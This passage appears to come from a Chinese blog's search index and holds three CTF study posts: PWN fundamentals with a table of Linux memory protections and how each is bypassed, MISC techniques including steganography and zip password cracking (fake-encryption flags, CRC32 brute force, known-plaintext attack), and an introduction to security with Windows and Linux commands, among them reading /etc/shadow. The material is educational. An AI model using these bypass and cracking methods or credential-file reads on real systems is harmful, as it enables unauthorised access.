表中已填充的条目）进行修改，但仍有一定安全隐患。\nFull RELRO（完全 RELRO）\n将整个 GOT 表（包括.dynamic 等重定位相关段）设置为只读，并在程序启动时提前解析所有动态链接符号（关闭延迟绑定）。 作用：彻底阻止对 GOT 表的修改，同时消除延迟绑定可能带来的漏洞（如 PLT 表劫持），但会略微增加程序启动时间。\n总结 以上就是六大章节，因为感觉学着每一章关系好像不是很大，前面elf后面又接个Linux保护机制，感觉很脱节，也可能是我的笔录存在不足，如果你们看到这里又问题的话，欢迎在评论区交流，Blogger会看到的！！！\n在这里总结下：\n汇编语言 讲了些量词：\n名称 翻译 大小 bit 比特 1位（1b） byte 字节 8位（1B） word 字 16位 dword 双字 32位 qword 四字 64位 汇编语言就是机器码的一个助记符，为了让人能看懂\n然后有一些常见寄存器种类需要去了解的，篇幅太长，可以回到上面去看：RBP栈底指针、RAX-R15通用寄存器、RSP栈顶指针、EFLAGS标志寄存器、RIP指令计数器\u0026hellip;\u0026hellip;；各种各样的寻址方式\u0026hellip;\u0026hellip;\n更重要的是认识了一门语言：汇编语言；初步了解一些汇编指令，如操作码、指令类型、实例和C语言运行得到效果比较\u0026hellip;\n溢出\nLinux基础 初步了解Linux的基本内容，保护层级ring、文件描述符、及Linux计算机内部的大端小端序存储形式\n大端序：数据高位存储在计算机地址的低位，数据低位存储在地址的高位。\n小端序：数据高位存储在计算机地址的高位，数据低位存储在地址的低位。\n初步认识栈的定义、作用、在PWN所发挥的威力。\n调用约定 这里重要的是函数调用流程，重点讲解push、pop、call、ret、jmp等汇编指令的使用效果。\n学习调用约定：返回值：一般来说，一个函数的返回值会存储到RAX寄存器。\nX86-64函数的调用约定为：从左至右参数一次传递给rdi，rsi，rdx，rcx，r8，r9。如果一个函数的参数多于6个，则从右至左压入栈中传递。\n系统调用：\n调用号码 名称 0 read 1 write 2 open 3 close 9 mmap 37 alarm 60 exit 62 kill 59 execv ELF文件 elf是 Linux 环境下二进制可执行文件的标准格式，存储在磁盘上，运行时加载到内存包含多个节（如.text 代码节、.data 数据节、.plt/.got 动态链接相关节等），节在加载时按权限合并映射到内存中的段有两种状态：未运行时作为静态载体存于磁盘，运行时加载到内存供CPU 执行。\nlibc是 Linux 下的 C 标准库（最常用的是 glibc），以.so 文件（本质也是 ELF）形式存在（如 /lib/libc.so.6） 包含大量基础函数，是绝大多数程序的依赖，在 CTF Pwn 中具有重要地位。\n两者关系：程序（ELF）运行时会动态链接 libc 中的函数，通过PLT/GOT 等机制实现调用。\n延迟绑定机制 动态链接库与编译方式：\n动态链接库（如 libc.so）存系统函数（read、printf 等），程序无需自己实现，动态调用即可；\n静态编译：把所有可能用到的库函数打包进可执行文件，不依赖外部库但体积大；\n动态编译：仅在调用时从库中取函数，体积小但依赖外部库。\nPLT 与 GOT 的作用和延迟绑定： 为解决动态编译中 “找函数地址” 的效率问题，用 GOT（全局偏移表，像 “小本本”）存函数地址，PLT（程序链接表，像 “跳板”）负责调用逻辑； 延迟绑定：程序启动时不解析所有函数地址，第一次调用时才通过 PLT 触发动态链接器（用_dl_runtime_resolve 函数）解析真实地址，并存入 GOT，后续调用直接读 GOT 即可。\n第一次调用外部函数的流程： 调用函数→跳 PLT 对应条目→GOT 未存真实地址，跳回 PLT 准备参数→跳 PLT 表头触发解析→动态链接器解析地址写入 GOT→后续调用直接用 GOT 地址。\nLinux安全防护机制 保护机制 核心作用 关键特点 绕过方式 CANARY 检测栈溢出 栈底存 8 字节（x64）随机数（首字节 \\x00），返回前比对 先泄漏栈上 canary，再用泄漏值覆盖栈上 canary NX 防 shellcode 执行 栈、堆等可写区域标记为 “不可执行” 用 mprotect 改权限，或用 ROP、GOT 劫持 PIE 程序自身加载地址随机 编译选项决定，每次运行加载地址不同 泄漏程序内函数地址，算基地址 ASLR 系统内存布局随机 系统机制，随机库、栈、堆地址 泄漏库函数地址，算目标函数地址 RELRO 防 GOT/PLT 劫持 分 Partial（.got.plt 只读）、Full（全 GOT 只读） Partial 可攻未保护 GOT 段；Full 弃 GOT 攻其他 结尾 基本的PWN理论知识就到这里了，现在你看别人PWN神的writeup应该不会这么“牢”了吧，基本能看懂别人说的专用词了。\n","date":"2025-08-21T00:00:00Z","headings":[{"id":"ctf是什么","level":1,"text":"CTF是什么？\n"},{"id":"pwn简介","level":2,"text":"PWN简介\n"},{"id":"汇编语言基础","level":2,"text":"汇编语言基础\n"},{"id":"linux基础","level":2,"text":"Linux基础\n"},{"id":"调用约定","level":2,"text":"调用约定\n"},{"id":"elf文件","level":2,"text":"ELF文件\n"},{"id":"延迟绑定机制","level":2,"text":"延迟绑定机制\n"},{"id":"linux安全防护机制","level":2,"text":"Linux安全防护机制\n"},{"id":"总结","level":2,"text":"总结\n"},{"id":"结尾","level":2,"text":"结尾\n"},{"id":"寄存器","level":3,"text":"寄存器\n"},{"id":"cpu的寻址方式","level":3,"text":"CPU的寻址方式\n"},{"id":"汇编指令","level":3,"text":"汇编指令\n"},{"id":"数值上下限溢出","level":3,"text":"数值上下限/溢出\n"},{"id":"汇编小结","level":3,"text":"汇编小结\n"},{"id":"操作系统","level":3,"text":"操作系统\n"},{"id":"数据存储","level":3,"text":"数据存储\n"},{"id":"文件描述符","level":3,"text":"文件描述符\n"},{"id":"栈stack","level":3,"text":"栈（stack）\n"},{"id":"函数调用流程","level":3,"text":"函数调用流程\n"},{"id":"调用约定-1","level":3,"text":"调用约定\n"},{"id":"elf","level":3,"text":"elf\n"},{"id":"libc","level":3,"text":"libc\n"},{"id":"动态链接库","level":3,"text":"动态链接库\n"},{"id":"静态编译和动态编译","level":3,"text":"静态编译和动态编译\n"},{"id":"plt与got","level":3,"text":"PLT与GOT\n"},{"id":"保护机制","level":3,"text":"保护机制\n"},{"id":"canary","level":3,"text":"CANARY\n"},{"id":"nx","level":3,"text":"NX\n"},{"id":"pie和aslr","level":3,"text":"PIE和ASLR\n"},{"id":"relro","level":3,"text":"RELRO\n"},{"id":"汇编语言","level":3,"text":"汇编语言\n"},{"id":"linux基础-1","level":3,"text":"Linux基础\n"},{"id":"调用约定-2","level":3,"text":"调用约定\n"},{"id":"elf文件-1","level":3,"text":"ELF文件\n"},{"id":"延迟绑定机制-1","level":3,"text":"延迟绑定机制\n"},{"id":"linux安全防护机制-1","level":3,"text":"Linux安全防护机制\n"}],"image":"https://expl0rer.top/p/pwn-1/PWN_hu_e8782ab2375c9d16.png","permalink":"https://expl0rer.top/p/pwn-1/","title":"PWN-1"},{"content":"[TOC]\n前言：拖了很久的MISC它来了，作者入门CTF第一个方向就是选择MISC的，当然它确实好入门，知识研究面不深，重在积累，研究面比较广，但我认为坏处就在这，技术不精，它重在让我了解CTF其它方向的知识，MISC比较适合作为你以后准备转方向的基础。\n虽说我已经转PWN方向，学了一年的MISC，有幸参加过省级CTF线下赛、盘古石取证杯，于心不忍抛弃这些积累知识点，我就想把我以前学到、积累过的知识点在这里系统地总结起来呈现给大家。\n杂项前传介绍 不多说，杂项就是“杂”，什么东西都有，Miscellaneous 简称 MISC，意思是杂项，混杂的意思。\n杂项大致有这几种类型：\n1、隐写：图片（webp、png、jpg、gif）、音频（mp4、mov等）、视频（mp4等）、其它。\n2、压缩包处理：zip、rar、7z等压缩包密码爆破、解压、拼接。\n3、流量分析：计算机网络协议、文件传输、USB、WIFI。\n4、数字取证：日志分析、内存取证分析、文件镜像取证、电子取证。\n5、脑洞题：说不尽\u0026hellip;，多是送分或者压分、彩蛋题。\n工具说明：Kali（binwalk、foremost）、010editor或者winhex、winrar、WPS\n文件类型识别 杂项题目主要是以文件附件作为题目，但是给的文件不一定是有后缀名的，这就需要我们识别这些文件，当然你可以用010editor/winhex等工具查看16进制/ASCII码去辨别特征判断类型，也可用file命令：\nfile命令：\nfile 命令实际上是一个命令行工具，用来查看文件类型。\n使用方法：\n将文件复制到 kail 或者带有 file 工具的系统中，使用 file 查看文件。\n然后将后缀名补上就可以正常打开了。\n010editor/winhex\n010Editor 是一款快速且强大的十六进制编辑器。用来编辑二进制文件。有一个友好易于使用的界面，无限次的 undo 和 redo 操作。另外还可以打印 x 十六进制的字节或者以书签的方式标出某些重要的字节。我们可以通过使用 010Editor 查看文件的头部来判断类型。\n以下是我积累总结出的文件头：\n文件类型 文件头 JPEG(jpg) FFDSFFE1 PNG(png) 89504E47 GIF(gif) 47494638 TIFF(tif) 49492A00 Windows Bitmap(bmp) 424DC001 ZIP Archive(zip) 504B0304 RAR Archive(rar) 52617221 Adobe Photoshop(psd) 38425053 Rich Text Format(rtf) 7B5C727466 XML(xml) 3C3F786D6C Adobe Acrobat(pdf) 255044462D312E Wave(wav) 57415645 pcap(pcap) D4C3B2A1 HTML(html) 68746D6C3E 用010editor举个例子：\n这里的文件头将贯穿你的MISC生涯，务必牢记这些文件头特征，以备不时之需！\n文件分离 介绍了文件类型的识别方法了，接下来来讲一下文件分离。\n文件分离的原因：\n在 CTF 这个充满脑洞的比赛中，出题人往往会以一些稀奇古怪的出题方式出题，因此你可以常常看见暴打出题人等字眼出现在比赛论坛中。在 CTF 中一个文件中隐藏着另外其他文件的题目是经常有的。这就需要掌握文件分离的技巧来应对。下面介绍几种方法：\nBinwalk 工具介绍：\nBinwalk 是一个自动提取文件系统，该工具可以自动完成指定文件的扫描，智能发掘潜藏在文件中所有可疑的文件类型及文件系统。相比于之前介绍的 file 命令行工具来说，file 只能把一个文件识别成一个类型的文件，很难看出是否隐藏着其他的文件，Binwalk 就能很好的完成这项任务。\n建议在Linux安装，Windows安装不太建议，比较鸡肋而且还会有电脑环境污染\n后续你从事网安信安行业时，或者此时打CTF尤其是杂项这个方向，工具、脚本、环境配置特别多，一道MISC题用十个工具解答也不惊讶，而且稍不注意下载破解版、私人汉化的工具可能会挂马，导致计算机中毒！！，再者很多工具和环境都是要求Linux系统的，所以建议还是安装一台Kali或者Ubuntu虚拟机系统更好。\n作者的MISC工具，忒多！！！\nbinwalk如何安装？自行解决。\nBinwalk命令分离misc文件（-e全名就是extract缩写）：\n1 binwalk -e misc 若提取成功则会生成一个文件名extracted的目录，目录中存放的就是提取出的文件。\nForemost 工具介绍：\nforemost 该工具通过分析不同类型文件的头、尾和内部数据结构，同镜像文件的数据进行比对，以还原文件。它默认支持 19 种类型文件的恢复。用户还可以通过配置文件扩展支持其他文件类型。\n有时候 binwalk 无法正确分离出文件，这时候就可以使用 foremost，将目标文件复制到 kali中，在终端中使用命令行进入文件所在文件夹，使用如下命令：\n1 foremost -o MISC 执行成功后会在目标文件的文件目录下生成我们设置的目录，目录有中按照文件类型分离出文件。\n手动提取 这个需要掌握！！在之前文件识别中提到这个工具，手动分离文件也可以使用这个工具拖动想要分离的部分。\n右键-\u0026gt;选择-\u0026gt;保存选择。然后根据需要分离的文件类型选择后缀名。\n文件提取小总结 凡事不要慌，binwalk+foremost 合体！\n隐写术 图片隐写术 遇到图片隐写，直接binwalk+foremost连招。\nLSB隐写 LSB 隐写，也就是最低有效位 (Least Significant Bit)。图片中的像数一般是由三原色组成，由这三种原色可以组成其他各种颜色，例如在 PNG 图片的储存中，每个颜色会有 8bit，LSB 隐写就是修改了像数中的最低的 1bit，写入加密信息，而人眼无法注意到前后的变化。\n例如此图看起只是六只环保色猪头，但是其中包含了一张隐藏的二维码，我们可以通过工具 Stegsolve.jar 打开此图，然后通过下方的按钮切换到 Gray bits，可以看到左上角出现了隐写在该通道的二维码，扫描二维码即可得到 flag。\n这里取一张网上的MISC-WP的图例：\n文件格式缺失\u0026amp;GIF隐写 一张名为“此为 gif 图片.gif”的文件，打开发现了报错。\n我们将其拖入 winhex 中查看。在 CTF 中有的时候会需要我们去修复图片，这对我们对于图片的文件结构要有了解。找到 gif 的文件格式，然后对照破损的文件对其进行修复。我们可以用工具一帧一帧的观察图片，Stegsolve 就带有这种功能。\nStegsolve —\u0026gt; Analyse —\u0026gt; Frame Brower\n图片隐写查看器——stegsolve LSB 隐写、一帧一帧的观察图片，都使用到了这个工具：\n今天做 CTF 隐写术的题偶然发现一隐写图片查看的神器\u0026mdash;\u0026mdash;stegsolve，分享给大家stegsolve 下载地址：http://www.caesum.com/handbook/Stegsolve.jar\nstegsolve 安装配置：配置好 Java 环境变量（就是需要安装 Java，然后配环境变量，具体的配置过程上网一搜一堆，这里就不赘述）配置好环境之后直接打开就可以使用😄。\n上面是软件打开的界面，界面简单。主要供能为 analyse，下面对 Analyse 下面几个功能键作简单介绍：\nFile Format:文件格式，这个主要是查看图片的具体信息；\nData Extract:数据抽取，图片中隐藏数据的抽取；\nFrame Browser:帧浏览器，主要是对 GIF 之类的动图进行分解，动图变成一张张图片，便于查看；\nImage Combiner:拼图，图片拼接。\n音视频隐写术 **音频相关的 CTF 题目主要使用的隐写策略，主要分为 MP3隐写、LSB隐写、波形隐写、频谱隐写等。\n使用的工具：\n● Audacity，ocenaudio 音频编辑的工具软件；\n● Mp3stego 将需要加密的数据压缩加密隐藏在 MP3 文件中；\n● video to Picture 可以将视频的每帧提转换成图片；\n● QR Research ctf 中常用的二维码识别软件；\n● mageMagick 是一个免费的创建、编辑、合成图片的软件。\n除了摩斯密码还有SSTV等等，可以上网搜。\nMP3隐写术 MP3 隐写两种方式：\n第一种：题目中给了密码了，用 mp3stego 去解密；\n第二种：如果在题目中没有给 key，而附件只给了一个 MP3，那就有可是用 mp3stego 隐藏的数据，也有可能是在音轨的频谱中隐藏了数据。\nMP3 隐写主要是使用 Mp3Stego 工具进行隐写，使用方法如下：\n1 encode -E hidden_text.txt -P pass svega.wavsvega_stego.mp3 演示图例暂不提供，详细了解可以自行参考其他大佬的MISC-WP。\n频谱隐写 频谱隐写：音频中的频谱隐写是将字符串隐藏在频谱中，此类音频通常会有一个较明显的特征，听起来是一段杂音或者比较刺耳。比如这题moectf2025—安全杂项的“捂住一只耳”，我们使用 audacity 打开。\n这道题听起来就不对劲，一只耳有滴滴嘟嘟的电频声。\n分离并掐头去尾：\n最好我们拿去解密就好了。\n当然还有另外一种：\n压缩包解密 压缩包有时候给到你时会设置密码不给你打开，也有可能是伪加密也可能是真加密。\n通用方法：\n1、用 winhex/010editor 打开，搜索字符 pass 、 key 、ctf、flag等，查看是否有含有压缩包密码；\n2、如果要爆破：先 0-6 位数字来一遍；\n3、如果爆破不成功可以根据题意或者社工 猜密码组合。例如某用户名叫王方，密码就有可能是 wangfang123；\n4、伪加密；\n5、明文攻击；\n6、CRC32 爆破。\n压缩包伪加密 zip 文件是由 3 部分组成\n压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志。\n在压缩源文件数据区有个 2 字节的全局方式位标记，在压缩源文件目录区也有个 2 字节的全局方式位标记，都用以标记是否加密，如下图（搬运）:\n若是没有加密的 zip,两处标记都是 00 00\n加密的 zip 两次都不是 00 00,好像不同版本的压缩软件或是算法,这里的值会不同,我看之前网上多见的是 09 00\n若把未加密的 zip 压缩源文件目录区的全局方式位标记改为 01 00 (或者 09 00),就会被压缩软件认为是已加密,即所谓的伪加密：\n破解伪加密的 zip,只要把压缩源文件目录区的全局方式位标记改为 00 00 即可解压。\nCRC32碰撞 CRC 校验实用程序库 在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。在诸多检错手段中，CRC 是最著名的一种。CRC 的全称是循环冗余校验。\n总之每个文件都有唯一的 CRC32 值，即便数据中一个 bit 发生变化，也会导致 CRC32 值不同。若是知道一段数据的长度和 CRC32 值，便可穷举数据，与其 CRC32 对照，以此达到暴力猜解的目的。但通常只适用于较小文本文件。\n比如这里有一个加密的 rar，直接双击就可以看见其中信息，而且我知道其中全是数字，便可写脚本爆破！\n自己可用python手搓或者AI写都可以。\n已知明文攻击即CRC32 爆破 所谓明文攻击就是已经通过其他手段知道 zip 加密文件中的某些内容，比如在某些网站上发现它的 readme.txt 文件，或者其他文件，这时就可以尝试破解了，例如我今天刚做了一个明文攻击的小题目：\n源文件是：明文攻击.zip,但是一看发现 zip 文件里面有一个之前看到过的 hash.exe，和一些其他加密文件，所以就将已经拥有的 hash.exe 压缩成 zip，注意打包完成后，需要确认二者采用的压缩算法相同。一个简单的判断方法是用 winRAR 打开文件，同一个文件压缩后的体积是否相同。如果基本相同，并且 crc32 也必须相同，可以说明你用的压缩算法是正确的。如果不同，就尝试另一种压缩算法。\n接下来就用神器 archpr 进行明文破解。\n如果得到了加密压缩包中的某个文件，那么就可以通过明文攻击来获取压缩密码：\n直接爆破 AccentRPR 利用了 GPU 爆破，速度还是比较快的。\n1、暴力：选择密码范围,长度等,由软件组合生成密码进行爆破；\n2、掩码：知道密码中的一部分,只需按规则构造其余部分；\n3、字典:通常是多数用户常用的一些密码集合,导入字典文件用其中的密码进行爆破。\n我还是建议使用上图的ARCHPR。\n文件爆破工具就这么多\u0026hellip;\nMISC总结 杂项的学习重在广泛学习，重在积累，很多题目的解题思路来的很微妙，要的就是那一种“直觉”、“做题敏感度”那样，比较像抽象数学题一样，思路来源很微妙。\n在这里把我入门MISC杂项的那几份writeup放出来，各位可以看看我的做题思路如何？😄做的差请原谅\u0026hellip;\n","date":"2025-08-14T00:00:00Z","headings":[{"id":"杂项前传介绍","level":2,"text":"杂项前传介绍\n"},{"id":"文件类型识别","level":2,"text":"文件类型识别\n"},{"id":"隐写术","level":2,"text":"隐写术\n"},{"id":"压缩包解密","level":2,"text":"压缩包解密\n"},{"id":"misc总结","level":2,"text":"MISC总结\n"},{"id":"文件分离","level":3,"text":"文件分离\n"},{"id":"图片隐写术","level":3,"text":"图片隐写术\n"},{"id":"音视频隐写术","level":3,"text":"音视频隐写术\n"},{"id":"压缩包伪加密","level":3,"text":"压缩包伪加密\n"},{"id":"crc32碰撞","level":3,"text":"CRC32碰撞\n"},{"id":"已知明文攻击即crc32-爆破","level":3,"text":"已知明文攻击即CRC32 爆破\n"},{"id":"直接爆破","level":3,"text":"直接爆破\n"}],"image":"https://expl0rer.top/p/misc/MISC_hu_d5917508839fb2.png","permalink":"https://expl0rer.top/p/misc/","title":"MISC"},{"content":"\n[TOC]\n网路空间安全导论 网络安全行业简介 ⽹络安全（Cyber Security）是指⽹络系统的硬件、软件及其系统中的数据受到保护，不因偶然\n的或者恶意的原因⽽遭受到破坏、更改、泄露，系统连续可靠正常地运⾏，⽹络服务不中断。\n起源与发展 互联网发展迅速。互联⽹（Internet）是⼀种全球性的计算机⽹络。 通过电⼦，⽆线和光纤⽹络等等⼀系列⼴泛的技术连接着全球各地的设备和⼈，它基于⼀组通⽤的协议相互连接，形成逻辑上的单⼀巨⼤国际⽹络。\n互联⽹始于1969年的美国阿帕⽹（ARPANET），最初是为了军事研究⽬的⽽建⽴的。随后，互联⽹逐渐发展成为⼀个覆盖全球的、由各种⽹络相互连接⽽成的庞⼤⽹络。\n网络安全意识与法律法规 法律法规 必须了解下，不然容易迷失自我~~ 中华人民共和国网络安全法.pdf\n网络安全就业 企业需求（哪些岗位需求大、薪资高） 岗位方向 网络安全管理概述 安全运营、运维、模型\n等级保护\n操作系统基础 问：为什么没有鸿蒙系统呢？？因为鸿蒙系统的基层代码开发，使ta本质上属于Linux，即ta的系统内核时Linux的，所以按分类ta属于Linux系统。以下是我认为作为网安人有必要去了解的一些基本操作系统知识，要详细的话还得去上完整课才。\nWindows系统 windows的一些常规命令自己知道就好，在这里不一一介绍，在下文中提到的命令，如果没见过就自己去搜一搜哈。\nWindows用户与组管理 Windows是多用户操作系统，即同一时间内允许多个用户同时使用计算机。用户组是一系列用户的集合，组内的用户自动具备该组所设置的权限。常用用户：\nsystem：本地机器上拥有最高权限的用户（为系统核心组件访问文件资源提供权限）\nAdministrator：默认系统管理员用户\n常用组:\nSYSTEM：最高权限的组\nAdministrators：管理员组（完全控制权）\nUsers：普通用户组\n诸如上述的效果可以通过这些指令：\n查看用户指令：\n1 net user 查看用户信息：\n1 net user \u0026lt;用户名\u0026gt; 新增用户：\n1 net user \u0026lt;用户名\u0026gt; \u0026lt;密码\u0026gt; /add 删除用户：\n1 net user \u0026lt;用户名\u0026gt; /del #del就是delete（删除）的缩写 新增用户组：\n1 net localgroup \u0026lt;组名\u0026gt; /add 将指定用户添加到指定组：\n1 net localgroup \u0026lt;组名\u0026gt; \u0026lt;用户名\u0026gt; /add 其实还有很多，比如开电脑的“户”的whoami、查看主机名的hostname、查看网络连接是否正常的ping呀、目录dir、天天用的cd/d，这些都是基础，在此提一下就好。\nWindows防火墙 防火墙（firewall）是一项协助确保信息安全的设备，会依照特定的规则，允许或限制传输的数据通过。Windows defender防火墙顾名思义就是在Windows操作系统中系统自带的软件防火墙。它有助于提高计算机的安全性。\n入站规则：别人电脑访问自己电脑的规则，出站规则：自己电脑访问别人电脑的规则。\nRDP远程桌面 RDP远程桌面，即远程桌面协议（Remote Desktop Protocol），是一种由微软公司研发并内置于Windows操作系统中的网络通信协议。\nRDP是一个多通道的协议，它允许用户通过网络连接到提供微软终端机服务的计算机，并在本地计算机上查看和操作远程计算机的桌面界面。通过RDP，用户可以远程登录到运行Windows操作系统的远程计算机，并像在本地计算机上一样使用远程计算机的资源和应用程序，这个其实类似我们如今todesk、向日葵远程等。\n市面上的远程链接软件如todesk都采用自研的混合传输协议，比较安全，而RDP连接没那么可靠，毕竟连接需要给出用户的密码和用户名，这相对有一定的风险。\n接下来使用一下RDP（有些家用版windows是没有RDP功能的，一般企业版多数有，主机没有RDP功能的就下两台虚拟机来实操一下咯）（指令在上文）：\n1、准备一或二台虚拟机win用来远程连接，可以下载两台虚拟机，win7和win 2003，我这里用主机和win7好看些。\n2、虚拟机/主机需要开启远程服务。\n3、防火墙要允许远程服务通过。\n4、创建一个用户用来远程登录，当然用本身用户也可以。\n5、在本地安全策略里的用户权限分配要将新建的用户加进去；在计算机管理里面的组里面的Administrators或者users里面添加刚刚新建的用户。\n6、另外开启一台虚拟机win二号要在开始菜单搜索远程桌面连接输入win1号的IP地址进行连接（相反连接也行），在输入刚刚新建的用户信息即可。\n前提：两台机子要相互ping通\n我这里用win7和win2003、自己的win11来进行实验。\nLinux系统 林纳斯·本纳第克特·托瓦兹——linux之父概况著名的电脑程序员、黑客。Linux内核的发明人及该计划的合作者。托瓦兹利用个人时间及器材创造出了这套当今全球最流行的操作系统（作业系统）内核之一。\nKali、Ubuntu、Dibian、CentOS下载，主要用Kali（关于Kali下载的问题汇总），Kali也是贯穿网安行业的的一部虚拟机，里面打包了几百种工具，有渗透、运维、蓝红队工具、甚至可以扩展到CTF所用到的基于Linux的python脚本等，而且还有不错的扩展性，可以按照自己的需要去额外加装脚本、软件、工具等。\nDebian：由志愿者开发的发行Linux的非商业项目。\nUbuntu：Debian项目构建的一个Linux发行版，专注于提供用户友好的桌面和服务器操作系统。\nKali：基于Debian的Linux发行版，预装了许多安全工具。\nRedHat：红帽公司，产品包括RHEL、Fedora Core与CentOS。\nCentOS：RHEL依照开放源代码规定释出的源码所编译而成。\n开源\nLinux是一个开源操作系统，源代码对用户开放，使用户可以自由获取、使用和修改。\n稳定\nLinux以其出色的稳定性而闻名。在大量的服务器应用中，稳定性是至关重要的因素。\n安全\nLinux具有良好的安全性。由于其开源性，Linux操作系统可以由全球的开发者社区进行审查和修复漏洞。这使得Linux具备快速响应和更新的能力，以应对不断变化的安全威胁。此外，Linux提供了强大的权限管理和安全工具，帮助管理员保护服务器免受潜在的威胁。\n发行版是指基于开源软件的操作系统的特定版本，经过整合、配置和打包后向用户发布的软件发行形式。它是将开源软件进行定制化和优化的结果，以便用户能够更方便地使用和管理操作系统。\n环境部署 Linux系统环境搭建 Linux常见分系统 Debian/ReaHat\nUbuntu/CentOS\nKali（渗透真神）\nLinux文件与目录管理 系统目录与重要系统文件 文件管理 touch 文件名 ：创建文件\nmkdir 目录名：创建目录 make dir\nmkdir -p a/b ： 同时创建父子目录\ncp：复制文件或目录copy\nmv：移动文件或目录move\nrm 文件或目录 ：删除文件或目录remove\nrm -rf 文件夹 ：删除非空目录\ncat查看文件内容\nhead查看文件头部内容\ntail查看文件尾部内容\ngrep根据匹配规则搜索(查找文件内容)\ngrep -c \u0026ldquo;root\u0026rdquo; /etc/passwd\nfind按照条件查找文件\nfind /etc -name \u0026ldquo;network*\u0026rdquo;\npwd：查看当前所在文件位置\ncd ：切换目录 （后面接绝对路径或相对路径）\nls ：以平铺方式显示当前目录包含内容\nls -a ：查看隐藏文件\nls -l ：以详细列表形式显示当前目录包含内容\nls：列出当前目录下文件\nll/ls -l：列出当前目录下文件（详细）\n命令行通配符\n*匹配0-多个字符\n? 匹配单个字符\n[a-z] 匹配 a - z 之间的一个\n[0-9]\ntouch 文件名 ：创建文件\nmkdir 目录名：创建目录 make dir\nmkdir -p a/b ： 同时创建父子目录\ncp：复制文件或目录copy\nmv：移动文件或目录move\nrm 文件或目录 ：删除文件或目录remove\nrm -rf 文件夹 ：删除非空目录\nLinux用户管理 用户与用户组配置详解 用户（User）\n用户账户：每个使用Linux系统的个体或进程都需要一个用户账户。用户账户包含了用户的信息，如用户名、用户ID（UID）、用户组、家目录、默认Shell等。\nUID（User ID）：每个用户都有一个唯一的数字标识符，称为用户ID（UID）。UID为0的用户是超级用户（root），拥有系统上的所有权限。\nroot\u0026ndash;系统管理员用户信息文件：/etc/passwd文件包含了系统上所有用户的信息。每一行代表一个用户，包括用户名、UID、组ID（GID）、用户全名或描述、家目录、默认Shell等信息。\n用户密码文件：用户的密码信息不直接存储在/etc/passwd文件中，而是存储在/etc/shadow文件中。该文件包含了加密后的密码、密码最后一次更改的日期、密码的最小和最大有效期等信息。\n用户常用命令 查看当前用户：whoami\n查看当前用户详细信息：id\n查看所有用户：cat /etc/passwd（可以看到root的UID为0，是超级用户的特征）\n查看用户数据信息：cat /etc/shadow\n那么用：来分隔的每段字符串是什么意思？kali：用户名。 $y$j9T$zY1oKFxJlTgP2WcJhzbNl1$xhkUmB8R9fzETc/1kgL/nOPcWFTvhn17clxXCgyFjpC：加密后的密码。采用的是带有 salt（盐值）的哈希加密方式，$y$ 等符号是标识加密算法等相关信息，这样的加密能增强密码安全性，防止彩虹表攻击。\n19953：最后一次修改密码的日期，是从 1970 年 1 月 1 日起算的天数。\n0：密码最小修改间隔天数，这里为 0 表示可以随时修改密码。 99999：密码有效期天数，即从最后一次修改密码后，经过这么多天密码就会过期需要修改。\n7：密码过期前提前多少天开始警告用户。\n后面的空字段：分别对应密码过期后的宽限天数（密码过期后仍可登录的天数）、账户失效时间（密码过期且宽限天数过后，账户失效无法登录的日期，这里为空）、保留字段（暂无特定用途）。\n这里了解下就好。\n添加用户：useradd -m 用户名\n删除用户：userdel 用户名\n修改用户信息：usermod\n配置密码：passwd 用户名\n切换用户：su 用户名（不加用户名表示切换root）以系统管理者的身份执行指令：sudo 具体命令 root：最高权限组与用户\n组（Group）\n用户组：用户组用于将多个用户组织在一起，以便于对文件或目录的权限管理。用户可以是多个组的成员。\nGID（Group ID）：每个用户组都有一个唯一的数字标识符，称为组ID（GID）。\n组信息文件：/etc/group文件包含了系统上所有用户组的信息。每一行代表一个组，包括组名、GID、组成员列表等信息。\n用户组常用命令 查看当前用户组：groups\n创建新用户组：groupadd\n删除用户组：groupdel\n修改用户组信息；groupmod\n查看所有组：cat /etc/group\n权限管理 更改文件所有者change owner\nchown kali:kali test\n修改为kali用户，kali组\n修改文件权限change mode\nchmod 777 aa\n给文件aa赋予rwx读、写、执行这三种权限，欸？为什么用数字代表？不是用rwx呢？这是因为：777 是权限数值，由三位数字组成，分别对应文件所有者（user）、所属组（group）、其他用户（other）的权限：数字 7 表示拥有读（r，对应数值 4）、写（w，对应数值 2）、执行（x，对应数值 1）的全部权限（4+2+1=7）。 因此 777 意味着所有者、所属组和其他用户对该文件都拥有读、写、执行的最高权限。\n那比如还有chmod 635就是代表：为目标文件或目录设置上述特定权限组合（所有者 rw-、所属组 -wx、其他用户 r-x）。\nchmod +x aa\nchmod u+x aa\nchmod g-x aa\nchmod u=rwx,g=rx,o=rx 文件名\n对于这个指令chmdo u=rw g=r o=rx aa，作为一个例子，意思是修改目录或文件aa，将赋予user用户有read读、write（w）权限，但没有x执行权限的权限。w在group这里省略了，代表“没有权限”；对于group组，分配read读权限，没有w和x的权限。other其他用户来说，分配read读和x执行权限。如下图所示:\n在这里可以发现，像change mode、password命令一样，都是些缩写，变成chmod、passwd这样的，很多Kali命令都是会缩写的，很好记。\nLinux进程与软件管理 进程概述 Linux系统进程是指在Linux操作系统中运行的每一个独立的任务或程序实例。每个进程都拥有自己的地址空间、系统资源（如文件句柄和内存）以及一个唯一的进程标识符（PID）。Linux通过进程模型实现了多任务处理和并发执行，允许同时运行多个进程。\n进程查看与控制 ifconfig：获取网卡状态或网卡配置\nping：检测网络连通\n这俩命令自己去试吧，我在这里保护好自己就不泄露IP啦\u0026hellip;\u0026hellip;\n当然有时候要用到IP、远程连接这样的话，难免会连接不上，那你可以试着重启，用到ifconfig \u0026lt;网卡比如eth0、eth1这样的\u0026gt; down，这样就把这个网卡关了，然后过一会就再输一次命令，把down换成up，就是开启网卡了。\nps：显示当前终端下运行的进程\nps -aux：显示所有用户的所有进程，包括系统进程，提供更详细的进程信息.第二张图可以看到我们刚刚用了ps -aux指令的记录。\nkill （PID）： 终止指定PID进程\nkill -9 （pid）：强制终止进程（-9 对应信号编号 9，即 SIGKILL 信号，这是一种强制终止信号，具有最高优先级。\n但是我比较建议你用上面的kill（PID），因为通常在进程正常终止（如 kill （PID）发送的 SIGTERM 信号）无效时，才会使用 -9 强制杀死进程，但这种方式可能导致进程正在处理的数据丢失或资源未正常释放，因此需谨慎使用）\n那有个问题来了，服务进程这么多一个个看PID查找忒麻烦啊！那可以用到pidof命令去找到你需要关闭的服务进程的pid。例如要关掉sshd远程连接服务，那我们就用pidof命令去找它的pid：\nnetstat 